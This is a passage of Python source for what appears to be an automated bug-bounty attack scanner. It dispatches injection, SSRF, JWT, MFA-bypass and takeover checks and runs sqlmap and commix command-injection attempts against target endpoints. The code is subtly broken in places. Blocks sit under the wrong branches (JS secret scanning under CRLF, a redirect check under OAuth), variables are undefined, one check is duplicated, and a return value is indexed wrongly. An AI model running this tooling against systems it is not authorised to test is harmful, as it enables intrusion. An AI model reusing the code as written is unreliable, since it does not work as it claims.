        "spring4shell":    30,
        "misconfig":       60,
        "smuggling":       30,
        "cve":            180,   # nuclei can be slow
        "smartcve":       180,
        "ai_deep":        300,
        "stored_xss":     180,
        "host_header":     60,
        "race_condition":  90,
        "websocket":       90,
        "business_logic": 120,
        "jwt_deep":        90,
        "ssrf_cloud":      90,
        "graphql_deep":   120,
        "dep_confusion":   90,
        "mfa_bypass":      60,
        "smuggling_deep":  90,
        "cors_deep":       60,
        "takeover_deep":   90,
        "ssti_deep":      120,
        # ── New engines (were missing -- defaulted to 120s) ─────────────────
        "bxss":           180,   # header + form + JSON injection
        "cache_poison":    90,
        "graphql_chain":  180,   # introspection + mutation chain
        "http2":           60,   # raw socket smuggling
        "mass_assign":     60,
        "mfa_deep":       120,   # TOTP brute + race condition
        "oauth_deep":     120,   # PKCE + redirect bypass
        "reset_poison":    60,
        "waf":             30,   # detection only
    }

    def run_custom(bug: str):
        found = []
        # Apply speed multiplier to caps
        em = SPEED["ends_mul"]

        # Pull in any new endpoints written by parallel recon before building this bug's cap
        _refresh_endpoints_for_bug(bug)

        # Emit live phase to feed
        _feed_phase(q, bug, f"testing {len(ends)} endpoints")
        cap = targets[:max(10, int(50 * em))]

        # ── Per-bug endpoint cap and H1-aware ordering ────────────────────────
        # Bugs that require '=' in URL must use param_ends not raw ends.
        # Using ends[:N] for param-based bugs wastes the cap on no-param paths
        # that will be immediately skipped by 'if "=" not in ep: continue'.
        _PARAM_BUGS = {"xss","sqli","lfi","ssrf","ssti","idor","redirect","crlf","nosqli","rce"}
        _bug_caps = {
            "xss":      max(30, int(100 * em)),
            "sqli":     max(30, int(100 * em)),
            "lfi":      max(30, int(100 * em)),
            "ssrf":     max(50, int(200 * em)),
            "ssti":     max(20, int(100 * em)),
            "idor":     max(20, int(100 * em)),
            "redirect": max(50, int(200 * em)),
            "crlf":     max(20, int(100 * em)),
            "rce":      max(30, int(100 * em)),
            "nosqli":   max(30, int(100 * em)),
        }
        _cap_n = _bug_caps.get(bug, max(50, int(200 * em)))
        # Use param_ends for param-dependent bugs — ensures cap is filled with testable URLs
        if bug in _PARAM_BUGS:
            _base_ends = param_ends[:_cap_n]
            if len(_base_ends) < _cap_n:
                # Top up from ends if param_ends is short
                _extra = [e for e in ends if e not in set(_base_ends)][:(_cap_n - len(_base_ends))]
                _base_ends = _base_ends + _extra
        else:
            _base_ends = ends[:_cap_n]

        # H1 per-bug endpoint reorder:
        # For this specific bug, push endpoints where:
        #   (a) H1 endpoint score > 0 AND the bug matches H1 rec matched_bugs, OR
        #   (b) any QS param maps to this bug via PARAM_BUG_MAP
        # to the FRONT of end_cap. Endpoints with no signal stay in H1-score order.
        # Cost: O(_cap_n) — iterates end_cap once, reads from _tl cache only.
        try:
            _ep_recs_ec   = getattr(_tl, 'h1_ep_recs', {})
            _param_map_ec = getattr(_tl, 'h1_param_map', {})
            _score_map_ec = getattr(_tl, 'h1_score_map', {})
            if _ep_recs_ec or _param_map_ec:
                from engine.h1_ingest import _normalise_endpoint as _h1_ne_ec
                def _ep_bug_score(url: str) -> float:
                    try:
                        _norm_ec = _h1_ne_ec(urllib.parse.urlparse(url).path)
                        _score_ec = _score_map_ec.get(_norm_ec, 0.0)
                        # Boost if H1 rec explicitly lists this bug
                        _rec_ec = _ep_recs_ec.get(_norm_ec)
                        if _rec_ec:
                            for _mb_ec in _rec_ec.get("matched_bugs", []):
                                if _mb_ec.get("bug_type") == bug:
                                    _score_ec += _mb_ec.get("score", 0) * 0.5
                        # Boost if any QS param maps to this bug
                        _qs_ec = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                        for _pn_ec in list(_qs_ec.keys())[:5]:
                            if bug in _param_map_ec.get(_pn_ec.lower(), []):
                                _score_ec += 20.0
                        return _score_ec
                    except Exception:
                        return 0.0
                # Stable sort — preserves existing H1 endpoint order within same score
                _base_ends = sorted(_base_ends, key=_ep_bug_score, reverse=True)
        except Exception:
            pass  # Never allowed to break scan; _base_ends unchanged

        end_cap = _base_ends

        # ── H1 per-bug decision log ────────────────────────────────────────────
        # Reads from pre-cached _tl.h1_ep_recs — no DB hit here.
        try:
            _ep_recs_local  = getattr(_tl, 'h1_ep_recs', {})
            _param_map_local = getattr(_tl, 'h1_param_map', {})
            # Log skip for param-based bugs when no injectable endpoints in cap
            if bug in _PARAM_BUGS:
                _injectable_in_cap = sum(1 for e in end_cap if '=' in e)
                if _injectable_in_cap == 0:
                    log.debug(f"[decision] {bug} → skipping: no injectable params in cap ({len(end_cap)} endpoints)")
                else:
                    log.debug(f"[decision] {bug} → {_injectable_in_cap}/{len(end_cap)} endpoints have params")
            if _ep_recs_local or _param_map_local:
                # Find highest-scored endpoint for this bug
                _best_ep_norm  = None
                _best_ep_score = 0.0
                _best_rec      = None
                _ep_params_hit  = []
                for _ep_u in end_cap[:10]:
                    try:
                        from engine.h1_ingest import _normalise_endpoint as _hn
                        _n = _hn(urllib.parse.urlparse(_ep_u).path)
                        _sc = _tl.h1_score_map.get(_n, 0.0)
                        if _sc > _best_ep_score:
                            _best_ep_score = _sc
                            _best_ep_norm  = _n
                            _best_rec      = _ep_recs_local.get(_n)
                        # Collect param names from this endpoint
                        _qs = urllib.parse.parse_qs(urllib.parse.urlparse(_ep_u).query)
                        for _pn in list(_qs.keys())[:5]:
                            if bug in _param_map_local.get(_pn.lower(), []):
                                _ep_params_hit.append(_pn)
                    except Exception:
                        pass
                # Log the decision
                _h1_signals = []
                if _best_ep_score > 0:
                    _h1_signals.append(f"ep_score={_best_ep_score:.1f}")
                if _best_rec:
                    _matched = [m["bug_type"] for m in _best_rec.get("matched_bugs",[])
                                if m["bug_type"] == bug]
                    if _matched:
                        _h1_signals.append(f"H1_rec=yes")
                if _ep_params_hit:
                    _h1_signals.append(f"param_match={_ep_params_hit[:3]}")
                if _h1_signals:
                    log.info(f"[decision] {bug} @ {_best_ep_norm or 'no-scored-ep'} "
                             f"signals=[{', '.join(_h1_signals)}]")
        except Exception:
            pass  # decision log is never allowed to break scan

        try:
            if bug == "expose":
                # Run expose in parallel across hosts with hard time limit
                cap_expose = cap[:20]  # max 20 hosts
                import concurrent.futures as _cfe
                import threading as _thr
                _exp_lock = _thr.Lock()
                def _run_expose(u):
                    try:
                        r = check_expose(u)
                        if r:
                            with _exp_lock: found.extend(r)
                    except Exception as e:
                        log.debug(f"expose {u}: {e}")
                # Also run AI tool attack surface scanner on each target
                def _run_ai_tools(u):
                    try:
                        r = check_ai_tools(u)
                        if r:
                            with _exp_lock: found.extend(r)
                    except Exception as e:
                        log.debug(f"ai_tools {u}: {e}")
                _exp_exe = _cfe.ThreadPoolExecutor(max_workers=10)
                try:
                    futures = (
                        [_exp_exe.submit(_run_expose, u) for u in cap_expose] +
                        [_exp_exe.submit(_run_ai_tools, u) for u in cap_expose[:30]]
                    )
                    _done, _not_done = _cfe.wait(futures, timeout=75)
                    for f in _not_done:
                        f.cancel()
                finally:
                    _exp_exe.shutdown(wait=False)
            elif bug == "cors":
                found.extend(check_cors(cap[0]) if cap else [])
                for _h in cap[:30]:
                    try: found.extend(check_cors(_h))
                    except: pass
            elif bug == "saml":
                for _h in cap[:20]:
                    try: found.extend(check_saml(_h))
                    except: pass
            elif bug == "jwt":
                try: found.extend(check_jwt_vulns(end_cap))
                except: pass
            elif bug == "panels":
                for _h in cap[:30]:
                    try: found.extend(check_panels(_h))
                    except: pass
            elif bug == "redirect":
                try: found.extend(check_redirect(end_cap))
                except: pass
            elif bug == "takeover":
                _take_subs = list({urllib.parse.urlparse(u).hostname for u in cap if u} - {None})
                try: found.extend(check_takeover(_take_subs))
                except: pass
                # MX takeover check (GarudRecon mx-takeover concept)
                try:
                    _mx_results = _check_mx_takeover(domain, targets)
                    found.extend(_mx_results)
                except Exception as _mxe:
                    log.debug(f"[scan] mx_takeover: {_mxe}")
            elif bug == "jsleak":
                js_eps_jl = [e for e in end_cap if re.search(r'\.js(?:\?|$)', e, re.I)][:50]
                try: found.extend(check_jsleak(js_eps_jl or end_cap))
                except: pass
                # Invisible prompt injection (AI supply chain)
                if _ELITE_ENGINES:
                    try: found.extend(check_prompt_injection_supply_chain(targets[:10], end_cap))
                    except Exception as _pie: log.debug(f"[scan] prompt_injection: {_pie}")
            elif bug == "actuator":
                def _run_actuator(u):
                    try: return check_actuator(u)
                    except: return []
                import concurrent.futures as _cf_actuator
                _exe_actuator = _cf_actuator.ThreadPoolExecutor(max_workers=5)
                futs_actuator = {_exe_actuator.submit(_run_actuator, u): u for u in cap[:20]}
                try:
                    for fut in _cf_actuator.as_completed(futs_actuator, timeout=60):
                        try:
                            res = fut.result(timeout=10)
                            if res: found.extend(res)
                        except: pass
                except Exception:
                    for _f in futs_actuator:
                        if not _f.done(): _f.cancel()
                finally:
                    _exe_actuator.shutdown(wait=False)
            elif bug == "graphql":
                log.info(f"[debug][graphql] testing {len(cap[:20])} hosts for GraphQL introspection")
                found.extend(check_graphql_injection(ends))
                # Parallel across hosts
                def _run_graphql(u):
                    try: return check_graphql(u)
                    except: return []
                import concurrent.futures as _cf_graphql
                _exe_graphql = _cf_graphql.ThreadPoolExecutor(max_workers=5)
                futs_graphql = {_exe_graphql.submit(_run_graphql, u): u for u in cap[:20]}
                try:
                    for fut in _cf_graphql.as_completed(futs_graphql, timeout=60):
                        try:
                            res = fut.result(timeout=10)
                            if res: found.extend(res)
                        except: pass
                except Exception:
                    for _f in futs_graphql:
                        if not _f.done(): _f.cancel()
                finally:
                    _exe_graphql.shutdown(wait=False)
            elif bug == "oauth":
                # Parallel across hosts
                def _run_oauth(u):
                    try: return check_oauth(u)
                    except: return []
                import concurrent.futures as _cf_oauth
                _exe_oauth = _cf_oauth.ThreadPoolExecutor(max_workers=5)
                futs_oauth = {_exe_oauth.submit(_run_oauth, u): u for u in cap[:20]}
                try:
                    for fut in _cf_oauth.as_completed(futs_oauth, timeout=60):
                        try:
                            res = fut.result(timeout=10)
                            if res: found.extend(res)
                        except: pass
                except Exception:
                    for _f in futs_oauth:
                        if not _f.done(): _f.cancel()
                finally:
                    _exe_oauth.shutdown(wait=False)
                _redir_matchable = sum(1 for e in end_cap if any(p in urllib.parse.parse_qs(urllib.parse.urlparse(e).query) for p in _redir_params) if '=' in e)
                log.info(f"[debug][redirect] cap={len(end_cap)}, redirect-param endpoints={_redir_matchable}")
                found.extend(check_redirect(end_cap))
            elif bug == "crlf":
                # Parallel across hosts
                def _run_crlf(u):
                    try: return check_crlf(u)
                    except: return []
                import concurrent.futures as _cf_crlf
                _exe_crlf = _cf_crlf.ThreadPoolExecutor(max_workers=5)
                futs_crlf = {_exe_crlf.submit(_run_crlf, u): u for u in cap[:20]}
                try:
                    for fut in _cf_crlf.as_completed(futs_crlf, timeout=60):
                        try:
                            res = fut.result(timeout=10)
                            if res: found.extend(res)
                        except: pass
                except Exception:
                    for _f in futs_crlf:
                        if not _f.done(): _f.cancel()
                finally:
                    _exe_crlf.shutdown(wait=False)
                # JS leak analysis (separate from executor)
                _js_dedup = []
                for _ju in end_cap:
                    if re.search(r'\.js(?:\?|#|$)', _ju, re.I):
                        _js_base = re.sub(r'[?#].*$', '', _ju)
                        if _js_base not in _js_seen:
                            _js_seen.add(_js_base)
                            _js_dedup.append(_ju)
                js_only = _js_dedup[:40]  # Hard cap at 40 unique JS files
                try:
                    if js_only and not _domain_stop.is_set():
                        jd = full_js_analysis(js_only, domain=domain)
                        for ep in jd.get("endpoints",[])[:200]:
                            if ep not in ends:
                                ends.append(ep)
                                if db: db.add_endpoint(domain, ep, source="js_deep")
                        for sink in jd.get("sinks",[]):
                            found.append(F("postmessage_xss","medium",domain,
                                "JS Sink: "+sink.get("type",""),
                                detail=sink.get("detail",""),confidence=70))
                except Exception as _e:
                    log.debug(f"[jsleak] js_deep: {_e}")

                # Layer 3: Elite secrets engine (trufflehog + gitleaks + detect-secrets)
                try:
                    from engine.secrets_engine import scan_domain_js
                    _js_seen2 = set()
                    js_only2 = []
                    for _ju in end_cap:
                        if re.search(r'\.js(?:\?|#|$)', _ju, re.I):
                            _jb = re.sub(r'[?#].*$', '', _ju)
                            if _jb not in _js_seen2:
                                _js_seen2.add(_jb)
                                js_only2.append(_ju)
                    js_only2 = js_only2[:30]  # Hard cap at 30 files
                    if js_only2:
                        sr = scan_domain_js(domain, js_only2, max_files=60)
                        for s in sr.get("findings",[]):
                            found.append(F("jsleak", s.get("severity","high"),
                                s.get("source",domain),
                                f"Secret [{s.get('tool','builtin')}]: {s.get('type','')}",
                                value=s.get("value","")[:120],
                                preview=s.get("preview",""),
                                confidence=90,
                                poc=s.get("context","")[:200],
                                impact="Exposed credential may enable account takeover or data breach",
                                remediation="Remove secret from code. Rotate immediately. Use env vars."))
                        log.info(f"[jsleak] secrets_engine: {sr.get('count',0)} secrets, {sr.get('critical',0)} critical")
                except Exception as _e:
                    log.debug(f"[jsleak] secrets_engine: {_e}")

                # Layer 4: JXScout v2 (if binary installed)
                try:
                    from engine.jxscout_v2 import _get_binary_path, scan_js_url as jx_scan
                    if _get_binary_path() and not _domain_stop.is_set():
                        _js_seen3 = set()
                        js_only3 = []
                        for _ju in end_cap:
                            if re.search(r'\.js(?:\?|#|$)', _ju, re.I):
                                _jb = re.sub(r'[?#].*$', '', _ju)
                                if _jb not in _js_seen3:
                                    _js_seen3.add(_jb)
                                    js_only3.append(_ju)
                        js_only3 = js_only3[:20]
                        for js_url in js_only3:
                            try:
                                from engine.jxscout import analyze_domain_js
                                jr = analyze_domain_js(domain, [js_url])
                                for ep in jr.get("endpoints", []):
                                    if ep and ep not in ends:
                                        ends.append(ep)
                                        if db: db.add_endpoint(domain, ep, source="jxscout_v2")
                            except Exception: pass
                            for s in jr.get("secrets", []):
                                found.append(F("jsleak","high",js_url,
                                    f"JXScout: {s.get('type','')}",
                                    value=s.get("value","")[:120],
                                    confidence=92, tool="jxscout_v2"))
                except Exception as _e:
                    log.debug(f"[jsleak] jxscout_v2: {_e}")
            elif bug == "xss":
                _with_params = sum(1 for e in end_cap if '=' in e)
                log.info(f"[debug][xss] cap={len(end_cap)} endpoints, {_with_params} with params")
                if _with_params == 0:
                    log.warning("[debug][xss] SKIPPING — no endpoints with '=' params in cap")
                # Phase 1: built-in reflection + context + KNOXSS-style (2789 payloads)
                found.extend(check_xss_bypass(end_cap))
                # Phase 2: DOM XSS (headless Chrome + findom patterns)
                try:
                    found.extend(check_dom_xss(end_cap, cap))
                except Exception as _dxe: log.debug(f"dom_xss: {_dxe}")
                # Phase 3: Deep XSS — context-aware, header, mXSS, template, CSP bypass
                try:
                    from engine.scanner_depth import deep_xss as _deep_xss, fp_reduce as _fp_r
                    _dx = _deep_xss(end_cap, q); found.extend(_fp_r(_dx))
                except Exception as _dx: log.debug(f"deep_xss: {_dx}")
                # Phase 3: kxss pre-filter → dalfox deep scan (with BXSS callback)
                try:
                    if _ELITE_ENGINES:
                        _bhost = os.getenv("BXSS_HOST","")
                    found.extend(run_xss_stack(end_cap, cap, blind_host=_bhost))
                except Exception as _dfe: log.debug(f"xss_stack: {_dfe}")
                # Phase 4: Proof-based XSS (context analysis — no browser)
                if _ELITE_ENGINES:
                    try: found.extend(check_xss_proof_based(end_cap, _get))
                    except Exception as _pbx: log.debug(f"xss_proof: {_pbx}")
            elif bug == "sqli":
                _with_params = sum(1 for e in end_cap if '=' in e)
                log.info(f"[debug][sqli] cap={len(end_cap)} endpoints, {_with_params} with params")
                if _with_params == 0:
                    log.warning("[debug][sqli] SKIPPING — no endpoints with '=' params in cap")
                # Phase 1: built-in error/time/union/blind (62 payloads)
                found.extend(check_sqli_bypass(end_cap))
                # Phase 2B: Deep SQLi — boolean-blind, header injection, JSON body
                try:
                    from engine.scanner_depth import deep_sqli as _deep_sqli, fp_reduce as _fp_r
                    _dq = _deep_sqli(end_cap, q); found.extend(_fp_r(_dq))
                except Exception as _dq: log.debug(f"deep_sqli: {_dq}")
                # Phase 2: Ghauri -- modern SQLi, better WAF bypass (runs if installed)
                try:
                    if _ELITE_ENGINES:
                        found.extend(_run_ghauri(end_cap, timeout=90))
                except Exception as _ghe: log.debug(f"ghauri: {_ghe}")
                # Phase 3: SQLMap -- deep confirmation + DBMS enumeration (runs if installed)
                try:
                    if _ELITE_ENGINES:
                        found.extend(_run_sqlmap(end_cap, level=2, risk=2, timeout=120))
                except Exception as _sme: log.debug(f"sqlmap: {_sme}")
                # OOBZero: blind SQLi via Pearson calibration (no callbacks)
                if _ELITE_ENGINES:
                    try: found.extend(check_sqli_oobzero(end_cap, _get))
                    except Exception as _ozc: log.debug(f"oobzero: {_ozc}")
                # OOBZero: blind SQLi via Pearson calibration (no callbacks)
                if _ELITE_ENGINES:
                    try: found.extend(check_sqli_oobzero(end_cap, _get))
                    except Exception as _ozc: log.debug(f"oobzero: {_ozc}")
                found.extend(check_second_order_sqli(ends))
                found.extend(check_api_versioning(targets, ends))
            elif bug == "lfi":
                _lfi_matchable = sum(1 for e in end_cap if any(p in urllib.parse.parse_qs(urllib.parse.urlparse(e).query) for p in ["file","path","page","doc","template","include","load","lang","view"]) if '=' in e)
                log.info(f"[debug][lfi] cap={len(end_cap)}, lfi-param endpoints={_lfi_matchable}")
                found.extend(check_lfi(end_cap))
                found.extend(check_lfi_win(end_cap))
            elif bug == "ssrf":
                _ssrf_params = {"url","callback","redirect","webhook","endpoint","fetch","proxy","src","target","dest","uri","host","link","image","feed"}
                _ssrf_matchable = sum(1 for e in end_cap if any(p in urllib.parse.parse_qs(urllib.parse.urlparse(e).query) for p in _ssrf_params) if '=' in e)
                log.info(f"[debug][ssrf] cap={len(end_cap)}, ssrf-param endpoints={_ssrf_matchable}")
                # SSRF: use oob_host if set, else run non-OOB version too
                if oob_host:
                    found.extend(check_ssrf_oob(end_cap, oob_host))
                    found.extend(check_ssrf_referer(cap, oob_host))
                found.extend(check_ssrf(end_cap))
                found.extend(check_ssrf_oob_injection(ends, oob_host))
                # Phase 2: Deep SSRF — IPv6/octal bypass, gopher, cloud metadata, POST body
                try:
                    from engine.scanner_depth import deep_ssrf as _deep_ssrf, fp_reduce as _fp_r
                    _ds = _deep_ssrf(end_cap, oob_host, q); found.extend(_fp_r(_ds))
                except Exception as _ds: log.debug(f"deep_ssrf: {_ds}")
            elif bug == "ssti":
                found.extend(check_ssti(end_cap))
            elif bug == "idor":
                try: found.extend(check_parameter_mining(ends, targets) or [])
                except Exception as _e: log.debug(f"[idor] parameter_mining: {_e}")
                try: found.extend(check_account_takeover(ends) or [])
                except Exception as _e: log.debug(f"[idor] account_takeover: {_e}")
                try: found.extend(check_idor_auth(end_cap, auth=bool(auth_targets)) or [])
                except Exception as _e: log.debug(f"[idor] idor_auth: {_e}")
            elif bug == "xxe":
                try: found.extend(check_xxe_oob(end_cap, cap, oob_host or "") or [])
                except Exception as _e: log.debug(f"[xxe] xxe_oob: {_e}")
            elif bug == "rce":
                found.extend(check_rce(end_cap))
                # ── Commix integration ────────────────────────────────────
                _commix_bin = shutil.which("commix") or (
                    next((os.path.join(d,"commix") for d in
                         [os.path.expanduser("~/go/bin"),"/home/kali/go/bin","/usr/local/bin"]
                         if os.path.isfile(os.path.join(d,"commix"))), None)
                )
                if _commix_bin and end_cap:
                    try:
                        import concurrent.futures as _cf_cx
                        def _run_commix(ep):
                            try:
                                cmd=[_commix_bin,"--url",ep,"--batch","--level","2",
                                     "--random-agent","--timeout","15","-q"]
                                import subprocess as _sp
                                r=_sp.run(cmd,capture_output=True,text=True,timeout=60)
                                out=r.stdout+r.stderr
                                if any(x in out.lower() for x in
                                       ["vulnerable","injection point","is vulnerable",
                                        "backdoor","pseudo-terminal","command injection"]):
                                    return ep
                            except: pass
                            return None
                        commix_eps=[e for e in end_cap if "=" in e][:15]
                        _cx_exe = _cf_cx.ThreadPoolExecutor(max_workers=3)
                        try:
                            for ep,result in zip(commix_eps,
                                _cx_exe.map(_run_commix,commix_eps,timeout=90)):
                                if result:
                                    found.append(F("rce","critical",ep,
                                        "Command injection confirmed via commix",
                                        tool="commix",
                                        poc=f"commix --url '{ep}' --batch --level=2",
                                        impact="Remote Code Execution -- full server compromise",
                                        remediation="Never pass user input to shell commands."))
                        except Exception as _cx_e:
                            log.debug(f"commix: {_cx_e}")
                        finally:
                            _cx_exe.shutdown(wait=False)
                    except Exception as _commix_e:
                        log.debug(f"[commix] outer: {_commix_e}")
            elif bug == "deserialization":
                found.extend(check_deserialization(cap))
            elif bug == "prototype":
                found.extend(check_prototype(end_cap))
                found.extend(check_hpp(end_cap))  # HPP often co-located with prototype
                found.extend(check_prototype_pollution(ends))
            elif bug == "fileupload":
                found.extend(check_fileupload(cap, end_cap))
            elif bug == "buckets":
                found.extend(check_buckets(domain, subs))
                found.extend(check_firebase(targets, domain))
                found.extend(check_elasticsearch(targets))
                found.extend(check_exposed_databases(targets))
            elif bug == "nosqli":
                found.extend(check_nosqli(end_cap))
            elif bug == "log4j":
                found.extend(check_log4j(cap))
            elif bug == "spring4shell":
                found.extend(check_spring4shell(cap))
            elif bug == "misconfig":
                found.extend(check_misconfig(cap))
                for _ep in targets[:20]:
                    found.extend(check_git_exposure(_ep))
                    found.extend(check_docker_k8s(_ep))
                found.extend(check_email_injection(cap))
                found.extend(check_soap_asmx(targets, ends))
                found.extend(check_account_takeover(ends))
                found.extend(check_security_headers(targets[:50]))
                found.extend(check_cookie_security(targets[:50]))
                found.extend(check_ws_security(targets[:50]))
                found.extend(check_api_versioning(ends, targets))
            elif bug == "smuggling":
                found.extend(check_request_smuggling(targets))
                found.extend(check_smuggling(cap))
            elif bug in ("cve","smartcve"):
                if _nuclei_bin():
                    tmp_t = _tmp(cap)
                    try:
                        found.extend(_nuclei(tmp_t, ["cves","vulnerabilities","exposures","misconfigurations","default-logins","takeovers","file","network","fuzzing"]))
                    finally:
                        _rm(tmp_t)
            elif bug == "ai_deep":
                for deep_bug in ["rce","sqli","lfi","ssrf","ssti","xss","idor","xxe"]:
                    found.extend(run_custom(deep_bug)[1])
            elif bug == "stored_xss" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_stored_xss(cap, end_cap, session_cookies=_ck))
            elif bug == "host_header" and _ELITE_ENGINES:
                found.extend(check_host_header_injection(cap, end_cap))
                found.extend(check_web_cache_deception(cap))
            elif bug == "race_condition" and _ELITE_ENGINES:
                found.extend(check_race_condition_advanced(ends))
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_race_conditions(cap, end_cap, session_cookies=_ck))
            elif bug == "websocket" and _ELITE_ENGINES:
                found.extend(check_websocket_security(targets, ends))  # CSWSH
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_websocket(cap, end_cap, session_cookies=_ck))
            elif bug == "business_logic" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_business_logic(cap, end_cap, cookies=_ck))
            elif bug == "jwt_deep" and _ELITE_ENGINES:
                found.extend(check_jwt_kid(ends))  # kid path traversal + JWKS spoofing
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_jwt_deep(cap, end_cap, session_cookies=_ck))
            elif bug == "ssrf_cloud" and _ELITE_ENGINES:
                found.extend(check_ssrf_cloud(cap, end_cap))
            elif bug == "graphql_deep" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_graphql_deep(cap, end_cap, session_cookies=_ck))
            elif bug == "dep_confusion" and _ELITE_ENGINES:
                found.extend(check_dependency_confusion(targets))
                found.extend(check_dep_confusion(cap, end_cap))
            elif bug == "cache_poison":
                found.extend(check_cache_poisoning(end_cap, cap))
            elif bug == "mass_assign":
                found.extend(check_mass_assignment(end_cap))
            elif bug == "reset_poison":
                found.extend(check_password_reset_poison(cap))
            elif bug == "mfa_bypass" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_mfa_bypass(cap, end_cap, session_cookies=_ck))
            elif bug == "smuggling_deep" and _ELITE_ENGINES:
                found.extend(check_smuggling_deep(cap, end_cap))
            elif bug == "cors_deep" and _ELITE_ENGINES:
                found.extend(check_cors_deep(cap, end_cap))
            elif bug == "takeover_deep" and _ELITE_ENGINES:
                _hosts = [urllib.parse.urlparse(u).hostname for u in cap if u]
                found.extend(check_takeover_deep([h for h in _hosts if h], end_cap))
            elif bug == "ssti_deep" and _ELITE_ENGINES:
                found.extend(check_ssti_deep(end_cap, cap))
            elif bug == "bxss" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_bxss_headers(cap))
                found.extend(check_bxss_forms(end_cap, cap))
                found.extend(check_bxss_json(end_cap))
            elif bug == "oauth_deep" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_oauth_deep(cap, end_cap, session_cookies=_ck))
            elif bug == "mfa_deep" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_mfa_deep(cap, end_cap, session_cookies=_ck))
            elif bug == "http2" and _ELITE_ENGINES:
                found.extend(check_http2_smuggling(cap))
                found.extend(check_http2_rapid_reset(targets))
            elif bug == "waf":
                found.extend(check_waf(cap))
            elif bug == "graphql_chain" and _ELITE_ENGINES:
                _ck = _auth_session.cookie_header() if (_auth_session and _auth_session.logged_in) else ""
                found.extend(check_graphql_exploit_chain(cap, end_cap, session_cookies=_ck))
            elif bug == "ldap_injection":
                found.extend(__import__('engine.injection_extras',fromlist=['check_ldap_injection']).check_ldap_injection(targets, ends))
            elif bug == "email_injection":
                found.extend(__import__('engine.injection_extras',fromlist=['check_email_injection']).check_email_injection(targets))
            elif bug == "method_override":
                found.extend(__import__('engine.injection_extras',fromlist=['check_http_method_override']).check_http_method_override(targets, ends))
            elif bug == "zip_slip":
                found.extend(__import__('engine.injection_extras',fromlist=['check_zip_slip']).check_zip_slip(targets, ends))
            elif bug == "api_version_bypass":
                found.extend(__import__('engine.injection_extras',fromlist=['check_api_version_bypass']).check_api_version_bypass(targets, ends))
            elif bug == "ssrf_pdf":
                found.extend(__import__('engine.injection_extras',fromlist=['check_ssrf_via_pdf_gen']).check_ssrf_via_pdf_gen(targets, ends))
            elif bug == "postmessage_xss":
                found.extend(__import__('engine.client_logic',fromlist=['check_postmessage_xss']).check_postmessage_xss(targets, ends))
            elif bug == "clickjacking":
                # Informational only — X-Frame-Options missing is not exploitable
                # without a sensitive authenticated action present
                raw_ci = __import__('engine.client_logic',fromlist=['check_clickjacking']).check_clickjacking(targets)
                # Force info severity
                for _ci_f in raw_ci:
                    _ci_f['severity'] = 'info'
                    _ci_f['confidence'] = max(_ci_f.get('confidence',50), 1)
                    _ci_f['confidence'] = min(_ci_f.get('confidence',50), 40)
                found.extend(raw_ci)
            elif bug == "dom_clobbering":
                found.extend(__import__('engine.client_logic',fromlist=['check_dom_clobbering']).check_dom_clobbering(targets, ends))
            elif bug == "lockout_bypass":
                found.extend(__import__('engine.client_logic',fromlist=['check_account_lockout_bypass']).check_account_lockout_bypass(targets))
            elif bug == "cache_deception":
                found.extend(__import__('engine.client_logic',fromlist=['check_web_cache_deception']).check_web_cache_deception(targets))
            elif bug == "s3_brute":
                company = domain.replace("www.","").split(".")[0]
                found.extend(__import__('engine.client_logic',fromlist=['check_s3_bucket_brute']).check_s3_bucket_brute(targets, company))
            elif bug == "param_pollution":
                found.extend(__import__('engine.client_logic',fromlist=['check_http_parameter_pollution']).check_http_parameter_pollution(targets, ends))


            elif bug == "jwt_alg_confusion":
                try:
                    from engine.jwt_deep import check_jwt_alg_confusion
                    found.extend(check_jwt_alg_confusion(targets, ends))
                except Exception as _e: log.debug(f"jwt_alg_confusion: {_e}")
            elif bug == "jwt_none":
                try:
                    from engine.jwt_deep import check_jwt_none_alg
                    found.extend(check_jwt_none_alg(targets, ends))
                except Exception as _e: log.debug(f"jwt_none: {_e}")
            elif bug == "graphql_introspection":
                try:
                    from engine.graphql_deep import check_graphql_introspection
                    found.extend(check_graphql_introspection(targets))
                except Exception as _e: log.debug(f"graphql_introspection: {_e}")
            elif bug == "graphql_injection":
                try:
                    from engine.graphql_deep import check_graphql_injection
                    found.extend(check_graphql_injection(targets, ends))
                except Exception as _e: log.debug(f"graphql_injection: {_e}")
            elif bug == "sqli_blind":
                try:
                    from engine.sqli_tools import check_sqli_blind
                    found.extend(check_sqli_blind(targets, ends))
                except Exception as _e: log.debug(f"sqli_blind: {_e}")
            elif bug == "sqli_time":
                try:
                    from engine.sqli_tools import check_sqli_time_based
                    found.extend(check_sqli_time_based(targets, ends))
                except Exception as _e: log.debug(f"sqli_time: {_e}")
            elif bug == "ssrf_aws":
                try:
                    from engine.ssrf_cloud import check_ssrf_aws
                    found.extend(check_ssrf_aws(targets, ends))
                except Exception as _e: log.debug(f"ssrf_aws: {_e}")
            elif bug == "ssrf_gcp":
                try:
                    from engine.ssrf_cloud import check_ssrf_gcp
                    found.extend(check_ssrf_gcp(targets, ends))
                except Exception as _e: log.debug(f"ssrf_gcp: {_e}")
            elif bug == "ssti_rce":
                try:
                    from engine.ssti_deep import check_ssti_rce
                    found.extend(check_ssti_rce(targets, ends))
                except Exception as _e: log.debug(f"ssti_rce: {_e}")
            elif bug == "xss_stored":
                try:
                    from engine.stored_xss import check_stored_xss
                    found.extend(check_stored_xss(targets, ends))
                except Exception as _e: log.debug(f"xss_stored: {_e}")
            elif bug == "oauth_pkce":
                try:
                    from engine.oauth_deep import check_oauth_pkce
